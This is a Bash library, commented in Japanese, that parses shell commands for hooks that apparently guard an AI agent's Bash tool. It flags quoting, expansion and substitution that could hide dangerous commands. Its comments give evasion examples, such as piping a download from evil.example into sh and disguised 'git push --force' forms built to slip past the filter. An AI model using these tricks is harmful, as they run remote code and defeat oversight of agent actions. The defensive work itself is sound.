#!/usr/bin/env bash
# PreToolUse フックが Bash ツールのコマンド文字列を読むための共有 reader。
# source 専用。set は呼び出し側に従う(set -u 下で動く)。
#
# 判定はしない。読んだ結果(token 列と segment 区切り)と、読み切れなかった理由
# (flag)だけを返し、それをどう扱うかは各フックの policy が決める。flag が立っても
# token は最後まで作る — 緩める判定は flag を見て諦め、塞ぐ判定は token から続けられる
# ようにするため(ADR 0009)。
#
# Interface: shell_reader_read / shell_reader_each_segment / shell_reader_token_has_mark /
# shell_reader_segment_follows / shell_reader_text_floor_matches。
# global の意味は各関数の直前のコメントを参照。`_` で始まる関数と global は lib の内部用で、呼び出し側は読まない。

# segment 区切りの番兵。入力に同じ byte があると偽の境界を注入できるので、
# SHELL_READER_SEP_IN_INPUT で呼び出し側に知らせる。
SHELL_READER_SEP=$'\x01'
SHELL_READER_MAX_LENGTH=8192

# token を確定させる。変数は動的スコープで shell_reader_read の local を読む。
# bash の関数定義は global なので、名前の衝突を避けて接頭辞を付けている。
_shell_reader_flush() {
    if [[ $started -eq 1 ]]; then
        if [[ $current_glob -eq 1 ]]; then
            _SHELL_READER_GLOB_MARKS[${#SHELL_READER_TOKENS[@]}]=1
        fi
        SHELL_READER_TOKENS+=("$current")
        current=''
        started=0
        current_glob=0
    fi
    current_quoted=0
}

# $1 を読んで次の global を設定する。常に 0 を返す。
#   SHELL_READER_TOKENS           token 配列(引用符は外してある)。区切りは SHELL_READER_SEP。
#                                 redirect は fd の数字ごと 1 token(`2>&1` が余計な `1` を残さない)
#   SHELL_READER_TOO_LONG         上限超過。token は空
#   SHELL_READER_EXPANSION        $ かバッククォートがある(引用符の中も含む)
#   SHELL_READER_WORD_MULTIPLIER  引用符の外の { } *(シェルの展開で単語数が変わる)
#   SHELL_READER_SEP_IN_INPUT     番兵の byte が入力にある
#   SHELL_READER_UNCLOSED_QUOTE   引用符が閉じないまま終わった
#   SHELL_READER_PROCESS_SUBSTITUTION  引用符の外に `<(` / `>(` か、語頭の `=(`(zsh の一時ファイル
#                                 版)がある。`)` の後ろは外側のコマンドの引数の続きだが、token 列では
#                                 別の segment に見える
# token についての印(展開・redirect 演算子)と位置の事実(heredoc・置換)は global ではなく、
# shell_reader_token_has_mark と shell_reader_segment_follows で問い合わせる。
# flag は呼び出し側(各フック)だけが読むので、lib 単体の shellcheck には未使用に見える。
# shellcheck disable=SC2034
shell_reader_read() {
    # ${s:i:1} は多バイトのロケールでは先頭から数え直すので二乗で遅くなる。byte 単位に
    # すると 1 文字あたりの費用が下がる(8 KB で 0.58 秒 → 0.13 秒以下)。UTF-8 の多バイト
    # 文字の byte は 0x80 以上で、ここで見る記号(すべて ASCII)と衝突しない。上限も
    # byte で数えるので、呼び出し側のロケールに依存しない。
    local LC_ALL=C
    local s=$1
    local length=${#s}
    _SHELL_READER_TOO_LONG_INPUT=''
    SHELL_READER_TOKENS=()
    # 印は token の index を添字にした疎な配列(値は 1)。1 回引く費用が印の数に依存しないので、
    # segment の token ごとに引いても二乗にならない。同じ index に何度印を付けても 1 件のまま。
    _SHELL_READER_BRACE_MARKS=()
    _SHELL_READER_GLOB_MARKS=()
    _SHELL_READER_OPERATOR_MARKS=()
    # 最初の heredoc 演算子と、最初の引用符の外の `$(` の位置。無ければ -1。
    _SHELL_READER_FIRST_HEREDOC=-1
    _SHELL_READER_FIRST_SUBSTITUTION=-1
    _SHELL_READER_SEGMENT_START=0
    SHELL_READER_TOO_LONG=0
    SHELL_READER_EXPANSION=0
    SHELL_READER_WORD_MULTIPLIER=0
    SHELL_READER_SEP_IN_INPUT=0
    SHELL_READER_UNCLOSED_QUOTE=0
    SHELL_READER_PROCESS_SUBSTITUTION=0

    if [[ $length -gt $SHELL_READER_MAX_LENGTH ]]; then
        SHELL_READER_TOO_LONG=1
        # token を作らない代わりに、shell_reader_text_floor_matches がコマンド全体を読む。
        _SHELL_READER_TOO_LONG_INPUT=$s
        return 0
    fi
    case "$s" in *'$'* | *'`'*) SHELL_READER_EXPANSION=1 ;; esac
    case "$s" in *"$SHELL_READER_SEP"*) SHELL_READER_SEP_IN_INPUT=1 ;; esac

    # current_quoted: 今の語に引用符か backslash が含まれる。`"2">x` / `\2>x` の 2 は fd ではなく
    # 引数(bash・zsh で実測)なので、fd の数字として読むのは引用されていない数字だけにする。
    local index character quote='' ansi_c=0 current='' started=0 current_glob=0 current_quoted=0 operator
    # after_dollar: 直前に読んだのが引用符の外の単独の `$`(`$$` と `$'` を除く)。次の `(` が置換を開く。
    # bash も zsh も行継続を語の読み取りより先に消すので(`$\⏎(…)` も置換)、行継続ではこの状態を保つ。
    local after_dollar=0 previous_dollar

    # `read -ra` は空白でしか分けないので、`-H "Accept: application/json"` が 2 token に
    # なり(後ろが URL と誤読される)、`-d '{"a":"x|y"}'` の `|` がパイプに見える。
    # 引数の境界を bash と同じに読むには、引用符を解釈する走査が要る。
    for ((index = 0; index < length; index++)); do
        character=${s:index:1}

        if [[ -n "$quote" ]]; then
            # "..." の中でも backslash は `"` と `\` をエスケープし、行継続も作る。
            # 普通の文字として扱うと bash と同期がずれる: `-H "A\"B"` の途中の引用符は
            # シェルには文字だが、backslash を素通しする走査ではそこで文字列が閉じ、
            # 次の `"` が(シェルが開いていない)文字列を開く。以降の空白・`|`・`;` は
            # すべて 1 token に飲まれ、`… "A\"B" https://evil.example/ | sh` が無害な
            # 引数 1 個に見える。ずれは `\"` が 2 回来るごとに元に戻るので、
            # 「走査は bash より細かく分けるだけ」という直感は安全ではない。
            if [[ "$quote" == '"' ]]; then
                case "$character" in
                \\)
                    case "${s:index+1:1}" in
                    '"' | \\)
                        index=$((index + 1))
                        current+=${s:index:1}
                        started=1
                        continue
                        ;;
                    $'\n')
                        index=$((index + 1))
                        continue
                        ;;
                    esac
                    ;;
                esac
            fi
            # `$'…'`(ANSI-C quoting)の中では backslash が `'` もエスケープする。普通の '…' として
            # 読むと `$'\''` の 2 つ目の `'` で走査だけが閉じて 3 つ目で開き、bash には引用符の外の
            # `; curl https://evil.example/ | sh; echo \'` が 1 token に飲み込まれる。
            if [[ $ansi_c -eq 1 && "$character" == \\ ]]; then
                index=$((index + 1))
                current+=${s:index:1}
                started=1
                continue
            fi
            if [[ "$character" == "$quote" ]]; then
                quote=''
                ansi_c=0
            else
                current+=$character
                started=1
            fi
            continue
        fi

        previous_dollar=$after_dollar
        after_dollar=0
        case "$character" in
        '{' | '}')
            # ブレース展開(`{x,https://evil.example/}` は 2 語になる)とブレースグループ
            # (`{ git push --force; }`)のどちらでも、記号自体は単語ではない。単語を区切って
            # 捨て、flag を立てて走査を続ける。塞ぐ側の判定が `git push origin {a,b} --force`
            # の `--force` を読めるようにするため。
            _shell_reader_flush
            SHELL_READER_WORD_MULTIPLIER=1
            # 展開の結果として危険な語が生まれうる(`{main,--force}` や `-{f..f}` は `--force` / `-f` に
            # なる)ので、どの segment に展開があるかを塞ぐ側が知れるように位置を残す。
            # bash は後ろが空白の `{` を展開しない(グループの `{ … ; }`)。
            if [[ "$character" == '{' ]]; then
                case "${s:index+1:1}" in
                '' | ' ' | $'\t' | $'\n') ;;
                *) _SHELL_READER_BRACE_MARKS[${#SHELL_READER_TOKENS[@]}]=1 ;;
                esac
            fi
            ;;
        '*')
            # cwd の全ファイルに展開されうる。token には残し、flag で知らせる。どの token が
            # 展開されるかも印で残す(`/usr/bin/curl*` や `/usr/bin/gi?` は展開の結果としてだけ
            # コマンド名になるので、呼び出し側が「この token が何になりうるか」を見られるように)。
            SHELL_READER_WORD_MULTIPLIER=1
            current_glob=1
            current+=$character
            started=1
            ;;
        '?' | '[')
            # `*` と同じパス名展開で、単語数を増やしうる(`[ab]x` は `ax` と `bx` に
            # 一致するので、`-H` の値がヘッダ+2 つ目の URL になる)。ここで一律に
            # 拒否すると `…/api?a=1` と `[::1]` まで巻き込むので、token に印を付けて
            # 呼び出し側が判断する。
            current_glob=1
            current+=$character
            started=1
            ;;
        '$')
            # `$$` は PID の parameter で、2 つ目の `$` は後ろの `'` の接頭辞ではない(`$$'\'` の
            # `'\'` は普通の引用符)。そこで 2 つまとめて文字として読む。`\$'` は引用符の外の
            # `\\)` の分岐が `$` を消費するのでここに来ない。
            case "${s:index+1:1}" in
            '$')
                index=$((index + 1))
                current+='$$'
                ;;
            "'")
                # `$` は token に残す。`$'\x2d-force'` のようにエスケープが中身を作るので、
                # 呼び出し側が「$ を含む token は読み切れない」として扱えるようにする。
                index=$((index + 1))
                current+='$'
                quote="'"
                ansi_c=1
                current_quoted=1
                ;;
            *)
                current+=$character
                after_dollar=1
                ;;
            esac
            started=1
            ;;
        "'" | '"')
            # 空の引用符も token になる(`-d ''`)。
            quote=$character
            started=1
            current_quoted=1
            ;;
        \\)
            index=$((index + 1))
            # backslash + 改行は行継続で、前後をつなぎ何も足さない。
            if [[ "${s:index:1}" != $'\n' ]]; then
                current+=${s:index:1}
                started=1
                current_quoted=1
            else
                after_dollar=$previous_dollar
            fi
            ;;
        ' ' | $'\t')
            _shell_reader_flush
            ;;
        ';' | '|' | $'\n' | '(' | ')')
            # `git push origin <(echo) --force` の `--force` は git の引数だが、`(` と `)` で
            # 区切ると別の segment に見える。区切りは変えずに flag で知らせる。
            if [[ "$character" == '(' && $index -gt 0 ]]; then
                case "${s:index-1:1}" in '<' | '>') SHELL_READER_PROCESS_SUBSTITUTION=1 ;; esac
                # zsh の `=(…)` も同じ(一時ファイル名に置き換わる)。語頭の `=` に限る —
                # `x=(a b)` は配列の代入で、語は `x=` になる。
                if [[ "$current" == '=' && $current_quoted -eq 0 ]]; then
                    SHELL_READER_PROCESS_SUBSTITUTION=1
                fi
            fi
            _shell_reader_flush
            # 引用符の外の `$(`(`$((` の算術展開を含む)は、区切りの番兵の位置で覚える。後ろの segment は
            # 置換の中身か、置換の出力をコマンド語にした続き(`$(which git) push …`)でありうる。
            if [[ "$character" == '(' && $previous_dollar -eq 1 && $_SHELL_READER_FIRST_SUBSTITUTION -lt 0 ]]; then
                _SHELL_READER_FIRST_SUBSTITUTION=${#SHELL_READER_TOKENS[@]}
            fi
            SHELL_READER_TOKENS+=("$SHELL_READER_SEP")
            ;;
        '&')
            # `&>file` は redirect であって区切りではない。
            if [[ "${s:index+1:1}" == '>' ]]; then
                _shell_reader_flush
                operator='>'
                index=$((index + 1))
                while [[ $((index + 1)) -lt $length && "${s:index+1:1}" =~ [\>\&0-9-] ]]; do
                    index=$((index + 1))
                    operator+=${s:index:1}
                done
                _SHELL_READER_OPERATOR_MARKS[${#SHELL_READER_TOKENS[@]}]=1
                SHELL_READER_TOKENS+=("$operator")
            else
                _shell_reader_flush
                SHELL_READER_TOKENS+=("$SHELL_READER_SEP")
            fi
            ;;
        '>' | '<')
            # 演算子の前の fd 番号だけの語は、独立した引数ではなく演算子に属する。
            # 引用された数字(`"2">x`)は引数のままなので、ここに来るのは引用の無い数字だけ。
            if [[ $current_quoted -eq 0 && "$current" =~ ^[0-9]+$ ]]; then
                operator=$current
                current=''
                started=0
                current_glob=0
            else
                _shell_reader_flush
                operator=''
            fi
            operator+=$character
            # 引用符の外の `<<` で、前にも後ろにも `<` が続かないものだけが heredoc(`<<<` は here-string)。
            # 2 つ目の `<` は前が `<` なので記録しない。`< <(…)` は間に空白があるので一致しない。
            # `<<` も `<<<` も `< <(…)` も token 列では `<`, `<` になるので、走査の時点でしか区別できない。
            if [[ $_SHELL_READER_FIRST_HEREDOC -lt 0 && "$character" == '<' && "${s:index+1:1}" == '<' &&
                "${s:index+2:1}" != '<' ]] && [[ $index -eq 0 || "${s:index-1:1}" != '<' ]]; then
                _SHELL_READER_FIRST_HEREDOC=${#SHELL_READER_TOKENS[@]}
            fi
            # `>|`(noclobber を無視する redirect)は 1 つの演算子。`|` を区切りに読むと、後ろの
            # ファイル名と引数(`git push origin main >| out --force` の `--force`)が別の segment になる。
            if [[ "$character" == '>' && "${s:index+1:1}" == '|' ]]; then
                index=$((index + 1))
                operator+='|'
            fi
            while [[ $((index + 1)) -lt $length && "${s:index+1:1}" =~ [\>\&0-9-] ]]; do
                index=$((index + 1))
                operator+=${s:index:1}
            done
            _SHELL_READER_OPERATOR_MARKS[${#SHELL_READER_TOKENS[@]}]=1
            SHELL_READER_TOKENS+=("$operator")
            ;;
        *)
            current+=$character
            started=1
            ;;
        esac
    done

    [[ -n "$quote" ]] && SHELL_READER_UNCLOSED_QUOTE=1
    _shell_reader_flush
    return 0
}

# 空でない segment ごとに callback を呼ぶ。callback の引数は segment の token で、callback の中では
# shell_reader_token_has_mark / shell_reader_segment_follows がその segment について答える。
# callback が非 0 を返したらそこで止めて 1 を返す。
# callback の中で token ごとに関数(この lib の述語を含む)を呼ぶなら、引数を配列に写してから `set --` で位置引数を
# 空にする。bash 3.2 は関数を呼ぶたびに、呼び出し元の位置引数の数に比例する費用が掛かる(4000 個の引数を持つ
# 関数から 1000 回呼ぶと 0.9 秒、`set --` の後は 0.03 秒)ので、1 つの segment に token が多いと二乗になる。
# bash は動的スコープなので、callback が local 宣言なしに代入した名前はこの関数の local を
# 書き換える。そのため local はすべて `_sr_` 接頭辞にしてある。契約: callback は `_sr_` で
# 始まる名前以外なら global を自由に使ってよい。
shell_reader_each_segment() {
    local _sr_callback=$1 _sr_position=0 _sr_count=${#SHELL_READER_TOKENS[@]} _sr_start=0
    local -a _sr_segment
    _sr_segment=()
    while [[ $_sr_position -lt $_sr_count ]]; do
        if [[ "${SHELL_READER_TOKENS[$_sr_position]}" == "$SHELL_READER_SEP" ]]; then
            if [[ ${#_sr_segment[@]} -gt 0 ]]; then
                _SHELL_READER_SEGMENT_START=$_sr_start
                if ! "$_sr_callback" "${_sr_segment[@]}"; then
                    _SHELL_READER_SEGMENT_START=0
                    return 1
                fi
            fi
            _sr_segment=()
            _sr_start=$((_sr_position + 1))
        else
            _sr_segment+=("${SHELL_READER_TOKENS[$_sr_position]}")
        fi
        _sr_position=$((_sr_position + 1))
    done
    _SHELL_READER_SEGMENT_START=0
    if [[ ${#_sr_segment[@]} -gt 0 ]]; then
        _SHELL_READER_SEGMENT_START=$_sr_start
        if ! "$_sr_callback" "${_sr_segment[@]}"; then
            _SHELL_READER_SEGMENT_START=0
            return 1
        fi
        _SHELL_READER_SEGMENT_START=0
    fi
    return 0
}

# 今の segment(shell_reader_each_segment の callback の中で、callback が受け取った segment)の $1 番目
# (segment の中の index。0 が先頭)の token に、callback の外では直前に読んだコマンドの $1 番目の token に、
# $2 以降の種類のどれかの印があれば 0、無ければ 1 を返す。fork しないので token ごとに呼んでよい。
#   brace     ブレース展開を始めうる `{` の直後の token。後ろが空白か入力の終わりの `{` はグループなので付けない
#   glob      引用符の外の * / ? / [ を含む token。`*` は WORD_MULTIPLIER も立てるが、どの token が展開されるかは
#             ここでしか分からない(`/usr/bin/curl*` が curl を作る)
#   operator  引用符の外の redirect 演算子の token。引用された `">"` や `\>` は引数なので付けない — token の字面
#             だけでは演算子と区別できないので、redirect として読み飛ばす側はここを見る
# 知らない種類を渡したら 2 を返す(呼び出し側の誤り。偽と同じく印が無い側に倒れるので stderr に出す)。
shell_reader_token_has_mark() {
    local position=$((_SHELL_READER_SEGMENT_START + $1)) kind
    shift
    for kind in "$@"; do
        case "$kind" in
        brace) [[ -n "${_SHELL_READER_BRACE_MARKS[$position]:-}" ]] && return 0 ;;
        glob) [[ -n "${_SHELL_READER_GLOB_MARKS[$position]:-}" ]] && return 0 ;;
        operator) [[ -n "${_SHELL_READER_OPERATOR_MARKS[$position]:-}" ]] && return 0 ;;
        *)
            printf 'shell_reader_token_has_mark: 知らない種類: %s\n' "$kind" >&2
            return 2
            ;;
        esac
    done
    return 1
}

# 今の segment(shell_reader_token_has_mark と同じ)が、$1 以降のどれかより後ろにあれば 0、無ければ 1 を返す。
#   heredoc       最初の heredoc 演算子(引用符の外の `<<` / `<<-`。here-string の `<<<` と `< <(…)` は含めない)。
#                 reader は heredoc の本文を知らないので、後ろの segment は本文の行でありうる
#   substitution  最初の引用符の外の `$(`(`$((` を含む)。後ろの segment は置換の中身か、置換の出力を
#                 コマンド語にした続き(`$(which git) push …`)でありうる。`a$;` や引用符の中の `"$("` は含めない
# 知らない種類を渡したら 2 を返す(shell_reader_token_has_mark と同じ)。
shell_reader_segment_follows() {
    local kind first
    for kind in "$@"; do
        case "$kind" in
        heredoc) first=$_SHELL_READER_FIRST_HEREDOC ;;
        substitution) first=$_SHELL_READER_FIRST_SUBSTITUTION ;;
        *)
            printf 'shell_reader_segment_follows: 知らない種類: %s\n' "$kind" >&2
            return 2
            ;;
        esac
        [[ $first -ge 0 && $_SHELL_READER_SEGMENT_START -gt $first ]] && return 0
    done
    return 1
}

# $1 を行ごとに見て、$2 以降の正規表現(POSIX ERE)すべてに一致する行が 1 つでもあれば 0、
# 無ければ 1 を返す。shell_reader_text_floor_matches の内部で使う(interface には含めない)。
#
# 照合の前に、行継続(`\` + 改行)をつなぎ(シェルと同じく何も足さない。空白を足すと
# `--\⏎force` が `-- force` になって一致しない)、引用符と backslash を取り除く。シェルはこれらを
# 外してから語を読むので、生の字面のままだと `"$(git'' push … --force)"`・`'curl' …`・
# `git push … \⏎--force` が一致しない。取り除くと一致は増える方向にしか動かない(床は ask に
# しかならないので、それで安全側)。
# つないだ行に加えて、つなぐ前の各行もそのまま残す。行末の `\` が行継続とは限らないため:
# `echo a\\⏎git push … --force` の `\\` はシェルには `\` 1 文字で、次の行は別のコマンドとして
# 実行されるが、つなぐと `echo agit push …` になって `git` の語頭が消える。reader は二重引用符の
# 中で `\\` を `\` 1 つにするので、ここでは `\` の個数から行継続かどうかを判定できない。どちらの
# 読みも残すと一致は増える方向にしか動かない。つないだ行は流しながら出し、つなぐ前の行は配列に
# ためて最後に出す(つないだ行を変数に足していくと、行継続だらけの入力で二乗になる)。
# 正規化は awk と tr を 1 回通す。bash 3.2 の `${s//…}` は 8 KB で 3 秒かかる(二乗より悪い)ため。
# 引用符も backslash も無ければ fork しない。正規化に失敗したら一致とみなす(読めないなら確認に倒す)。
# here-string は一時ファイルを使う($TMPDIR に書けないと黙って「一致なし」になる)ので使わない。
# `${s%%$'\n'*}` / `${s#*$'\n'}` の行ループも使わない — 残りの文字列を毎行コピーするので二乗になり、
# 179 KB に 2.3 秒かかった。改行での単語分割は線形(同じ入力で 0.02 秒)。
# 空行は落ちるが、空行に一致させる正規表現は無い。
_shell_reader_any_line_matches() {
    local LC_ALL=C text=$1 line regex all restore_glob=0
    local -a lines
    shift
    case "$text" in
    *[\"\'\\]*)
        text=$(printf '%s\n' "$text" |
            awk '{ continued = sub(/\\$/, "")
                   if (continued || previous) physical[n++] = $0
                   if (continued) printf "%s", $0; else print
                   previous = continued }
                 END { if (previous) print ""; for (i = 0; i < n; i++) print physical[i] }' |
            tr -d "\"'\\\\") || return 0
        ;;
    esac
    local IFS=$'\n'
    # 分割の結果が glob として cwd に展開されないように、分割の間だけ set -f にする。
    if [[ $- != *f* ]]; then
        set -f
        restore_glob=1
    fi
    # shellcheck disable=SC2206 # 改行での単語分割そのものが目的
    lines=($text)
    [[ $restore_glob -eq 1 ]] && set +f
    [[ ${#lines[@]} -eq 0 ]] && return 1
    for line in "${lines[@]}"; do
        all=1
        for regex in "$@"; do
            if ! [[ "$line" =~ $regex ]]; then
                all=0
                break
            fi
        done
        [[ $all -eq 1 ]] && return 0
    done
    return 1
}

# 直前の shell_reader_read が読んだコマンドの字面の床(GLOSSARY の Text Floor)。reader が bash と同期を外しうる部分を対象に、
# $1 以降の正規表現(POSIX ERE)すべてに一致する行が 1 つでもあれば 0、無ければ 1 を返す。
# 正規表現(= 判定)は呼び出し側が渡す。一致しても読み切れないという意味しかないので、呼び出し側は
# deny ではなく ask にする(散文の PR 本文も同じ形になる)。
#
# 対象は次のとおり。どれも reader が heredoc・コメント・置換の中の入れ子の引用符を読まないことから来る。
# - 長さ超過のとき: token が無いので、コマンド全体
# - `$(` / `${` / バッククォートを含む最初の token から後ろのすべての token。引用符の中の置換に入れ子の
#   引用符があると(`"$(echo "a it's")"`)、reader は入れ子の `"` で引用符が閉じたと読み、その後ろの同期が
#   ずれる。`echo "$(echo "a it's")" ; git push origin main --force ; echo ' x'` では、bash が実行する push が
#   改行も `$` も無い 1 token に飲み込まれる。ずれはその置換より後ろでしか起きない
# - `$` かバッククォートを含む token(置換の中は 1 つの文字列の token になる)
# - 改行を含む token。本文やコメントの中の引用符 1 つ(`it"s`、`# "`)で走査だけが引用符の中に入り、
#   次の同じ引用符までの行が 1 token に飲み込まれる
# - 引用符が閉じないまま終わったときの最後の token(それ以降をすべて飲み込んでいる)
# token ごとに 1 行なので、別々の token が 1 行に組み合わさることはない。
# 対象の token は改行で区切って 1 つにまとめ、正規化は 1 回だけ通す。正規化は引用符や backslash を含む
# 入力で awk / tr を fork するので、token ごとに通すと `"$'"` を 1000 個並べただけで秒単位になり、
# フックの timeout(5 秒)を越えると判定なし = フェイルオープンになる。
shell_reader_text_floor_matches() {
    if [[ $SHELL_READER_TOO_LONG -eq 1 ]]; then
        _shell_reader_any_line_matches "$_SHELL_READER_TOO_LONG_INPUT" "$@"
        return
    fi
    [[ ${#SHELL_READER_TOKENS[@]} -eq 0 ]] && return 1
    local token text='' after_substitution=0 included=0
    for token in "${SHELL_READER_TOKENS[@]}"; do
        included=0
        case "$token" in *\$\(* | *\$\{* | *\`*) after_substitution=1 ;; esac
        if [[ $after_substitution -eq 1 ]]; then
            included=1
        else
            case "$token" in *'$'* | *'`'* | *$'\n'*) included=1 ;; esac
        fi
        if [[ $included -eq 1 ]]; then
            text+=$token$'\n'
        fi
    done
    # 閉じない引用符の最後の token は、上で足していなければ足す(同じ token を 2 回正規化しない)。
    if [[ $SHELL_READER_UNCLOSED_QUOTE -eq 1 && $included -eq 0 ]]; then
        text+=${SHELL_READER_TOKENS[${#SHELL_READER_TOKENS[@]} - 1]}$'\n'
    fi
    [[ -n "$text" ]] || return 1
    _shell_reader_any_line_matches "$text" "$@"
}
